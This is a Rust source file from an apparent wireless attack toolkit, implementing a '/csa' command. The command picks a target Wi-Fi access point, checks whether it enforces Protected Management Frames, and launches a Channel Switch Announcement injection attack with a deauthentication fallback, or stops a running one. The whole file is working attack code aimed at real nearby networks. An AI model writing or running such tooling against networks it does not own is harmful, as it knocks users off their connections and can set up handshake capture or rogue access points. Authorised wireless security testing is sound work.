//! CSA injection attack command: /csa [target] | /csa stop

use crate::attacks::csa::CsaParams;
use crate::cli::module::Module;
use crate::cli::scanner::{ScannerModule, DetailState};
use crate::cli::views::csa::CsaModule;
use crate::store::Ap;
use super::{Ctx, Mode};

/// /csa [target] | /csa stop
pub fn run(ctx: &mut Ctx, args: &str) {
    let args = args.trim();

    // /csa stop
    if args == "stop" {
        let state = ctx.state.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(csa_mod) = state.focus_stack.find_as::<CsaModule>("csa") {
            csa_mod.attack().signal_stop();
            drop(state);
            ctx.layout.print(&format!("  {} Stopping CSA attack...",
                prism::s().dim().paint("\u{25cf}")));
        } else {
            drop(state);
            ctx.layout.print(&format!("  {} No CSA attack running.",
                prism::s().dim().paint("\u{25cf}")));
        }
        return;
    }

    // Preconditions
    if !ctx.require_no_attack() { return; }
    if !ctx.require_scanner() { return; }
    if !ctx.require_adapter() { return; }

    // Resolve target AP
    let target_ap = {
        let state = ctx.state.lock().unwrap_or_else(|e| e.into_inner());
        let scanner_mod = match state.focus_stack.find_as::<ScannerModule>("scanner") {
            Some(m) => m,
            None => return,
        };
        let aps: Vec<Ap> = ctx.store.get_aps().into_values().collect();

        if aps.is_empty() {
            drop(state);
            ctx.layout.print(&format!("  {} No APs discovered yet. Wait for scan results.",
                prism::s().yellow().paint("\u{26a0}")));
            return;
        }

        if args.is_empty() {
            // Drilled-in AP or selected row
            if let DetailState::Ap { bssid, .. } = &scanner_mod.detail {
                match aps.iter().find(|ap| &ap.bssid == bssid) {
                    Some(ap) => ap.clone(),
                    None => {
                        drop(state);
                        ctx.layout.print(&format!("  {} AP no longer in scan results.",
                            prism::s().red().paint("!")));
                        return;
                    }
                }
            } else {
                let selected_idx = scanner_mod.selected.min(aps.len().saturating_sub(1));
                aps[selected_idx].clone()
            }
        } else if args.contains(':') && args.len() == 17 {
            // BSSID
            let bytes: std::result::Result<Vec<u8>, _> = args.split(':')
                .map(|h| u8::from_str_radix(h, 16))
                .collect();
            match bytes {
                Ok(b) if b.len() == 6 => {
                    let mac = crate::core::mac::MacAddress::new([b[0], b[1], b[2], b[3], b[4], b[5]]);
                    match aps.iter().find(|ap| ap.bssid == mac) {
                        Some(ap) => ap.clone(),
                        None => {
                            drop(state);
                            ctx.layout.print(&format!("  {} AP not found: {}",
                                prism::s().red().paint("!"), args));
                            return;
                        }
                    }
                }
                _ => {
                    match aps.iter().find(|ap| ap.ssid == args) {
                        Some(ap) => ap.clone(),
                        None => {
                            drop(state);
                            ctx.layout.print(&format!("  {} AP not found: {}",
                                prism::s().red().paint("!"), args));
                            return;
                        }
                    }
                }
            }
        } else {
            // SSID
            match aps.iter().find(|ap| ap.ssid == args) {
                Some(ap) => ap.clone(),
                None => {
                    drop(state);
                    ctx.layout.print(&format!("  {} AP not found: {}",
                        prism::s().red().paint("!"), args));
                    return;
                }
            }
        }
    };

    // Detect PMF status and print strategy
    let pmf = crate::attacks::csa::PmfStatus::from_ap(&target_ap);
    let strategy = match pmf {
        crate::attacks::csa::PmfStatus::Required => "CSA-only (deauth blocked by PMF)",
        crate::attacks::csa::PmfStatus::Capable => "CSA + deauth fallback (PMF capable)",
        crate::attacks::csa::PmfStatus::None => "CSA + deauth (no PMF)",
    };

    ctx.layout.print(&format!("  {} {} \u{2192} {}  {}  ch{}",
        prism::s().cyan().paint("\u{25b6}"),
        prism::s().cyan().bold().paint("CSA injection"),
        prism::s().bold().paint(&target_ap.ssid),
        prism::s().dim().paint(&target_ap.bssid.to_string()),
        target_ap.channel));

    let pmf_label = match pmf {
        crate::attacks::csa::PmfStatus::Required =>
            prism::s().red().bold().paint("PMF:required"),
        crate::attacks::csa::PmfStatus::Capable =>
            prism::s().yellow().paint("PMF:capable"),
        crate::attacks::csa::PmfStatus::None =>
            prism::s().dim().paint("PMF:off"),
    };
    ctx.layout.print(&format!("  {} {}  Strategy: {}",
        prism::s().dim().paint(" "),
        pmf_label,
        prism::s().dim().paint(strategy)));

    // Select adapter
    let attack_adapter = match ctx.select_adapter_for_attack("CSA attack") {
        Some(a) => a,
        None => return,
    };

    // Create CSA module and start
    let params = CsaParams {
        deauth_fallback: pmf == crate::attacks::csa::PmfStatus::None,
        ..Default::default()
    };

    let mut csa_module = CsaModule::new(params);
    csa_module.set_targets(target_ap, None);
    csa_module.start(attack_adapter);

    ctx.layout.print(&format!("  {} Attack started. {} to stop.",
        prism::s().green().paint("\u{25cf}"),
        prism::s().cyan().paint("/csa stop")));
    ctx.layout.print("");

    // Push to focus stack
    {
        let mut state = ctx.state.lock().unwrap_or_else(|e| e.into_inner());
        state.focus_stack.push(Box::new(csa_module));
        state.mode = Mode::Normal;
    }
}
